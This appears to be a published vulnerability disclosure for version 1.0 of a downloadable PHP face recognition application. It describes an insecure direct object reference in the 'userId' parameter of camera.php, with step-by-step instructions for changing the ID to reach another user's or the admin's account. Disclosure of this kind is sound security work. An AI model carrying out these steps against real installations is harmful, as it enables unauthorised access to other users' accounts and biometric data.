# Exploit Title: Horizontal Privilage Escaltion through idor in face recognition 
# Exploit Author: Ramansh Sharma
# Vendor Homepage: https://diyaact.com/php-source-code/face-recognition-php.zip
# Software Link: https://diyaact.com/php-source-code/face-recognition-php.zip
# Version: v1.0
# Tested on: Windows 11, Apache

Description: Horizontal privilege escalation is when a user gains the access rights of another user who has the same access level as he or she does. 
That might sound a little weird. 
You might wonder why someone would want to gain the rights of someone at the same level as that person.
Vulnerable Parameters:
GET /face-recognition-php/facepay-master/camera.php?userId=1 


Payload:
change the userid in for.eg my user is 3 & i changed it to 1

Steps:
1) Login into my own account
2) Now you redirct to this http://localhost/face-recognition-php/facepay-master/index.php
3) Now click on this Enrol Your Face Biometric Data & you will be redirected to http://localhost/face-recognition-php/facepay-master/camera.php?userId=2
4) Now change the user id to 1 & you will be privilaged to the admin access
